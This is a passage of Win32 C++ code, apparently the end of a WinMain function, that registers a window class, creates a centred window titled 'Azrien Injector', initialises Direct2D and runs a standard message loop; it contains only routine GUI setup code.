    WNDCLASSEXW wc = {sizeof(wc), CS_HREDRAW | CS_VREDRAW, WndProc, 0, 0, hI, NULL, LoadCursor(NULL, IDC_ARROW), NULL, NULL, L"AzFinder", NULL};
    RegisterClassExW(&wc);
    g_hWnd = CreateWindowExW(0, L"AzFinder", L"Azrien Injector", WS_OVERLAPPEDWINDOW | WS_VISIBLE, (GetSystemMetrics(SM_CXSCREEN) - WINDOW_WIDTH) / 2, (GetSystemMetrics(SM_CYSCREEN) - WINDOW_HEIGHT) / 2, WINDOW_WIDTH, WINDOW_HEIGHT, NULL, NULL, hI, NULL);
    InitD2D(g_hWnd);
    ShowWindow(g_hWnd, nS);
    UpdateWindow(g_hWnd);
    MSG m;
    while (GetMessageW(&m, NULL, 0, 0))
    {
        TranslateMessage(&m);
        DispatchMessageW(&m);
    }
    return (int)m.wParam;
}
